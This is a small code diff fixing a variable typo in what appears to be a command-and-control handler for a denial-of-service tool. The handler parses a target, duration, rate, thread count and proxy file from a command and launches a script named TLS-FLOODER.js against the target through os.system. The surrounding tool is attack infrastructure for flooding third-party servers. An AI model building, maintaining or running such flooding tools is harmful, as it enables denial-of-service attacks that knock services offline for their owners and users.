@@ -96,7 +96,7 @@ def main():
                 target = cnc.split()[1]
                 time = cnc.split()[2]
                 Rate = cnc.split()[3]
-                treads = cnc.split()[4]
+                threads = cnc.split()[4]
                 proxyFile = cnc.split()[5]
                 os.system(f'node TLS-FLOODER.js {target} {time} {Rate} {threads} {proxyFile}')
             except IndexError:
